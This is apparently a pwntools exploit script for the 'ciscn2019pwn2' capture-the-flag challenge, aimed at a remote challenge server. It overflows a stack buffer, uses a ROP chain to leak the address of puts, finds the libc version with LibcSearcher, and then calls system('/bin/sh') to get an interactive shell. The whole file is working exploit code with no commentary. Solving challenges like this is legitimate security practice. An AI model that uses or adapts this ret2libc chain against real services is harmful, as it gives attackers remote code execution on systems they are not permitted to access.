from pwn import *
from LibcSearcher import *
p = remote("1.14.71.254",28413)
#1.14.71.254:28977
elf = ELF("./ciscn2019pwn2")
#libc = ELF("./libc-2.27-x64(18).so")
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']

main=0x400B28
rdi=0x0000000000400c83 
rsi_r15=0x0000000000400c81 
rsp=0x0000000000400c7d 
ret=0x00000000004006b9 

p.sendlineafter("choice!\n",'1')

#p.sendline(b'a')
payload=b'a'*(0x50+0x8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
p.sendline(payload)

puts_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
#puts_addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))
#pause()


#offset=puts_addr-libc.symbols['puts']
#system=offset+libc.symbols['system']
#binsh=offset+libc.search(b'/bin/sh').__next__()
libc=LibcSearcher('puts',puts_addr)
offset=puts_addr-libc.dump('puts')
system =offset+libc.dump('system')
binsh=offset+libc.dump('str_bin_sh')

p.sendlineafter("choice!\n",'1')
#p.sendline(b'a')
payload2=b'a'*(0x50+0x8)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)
p.sendline(payload2)
p.interactive()
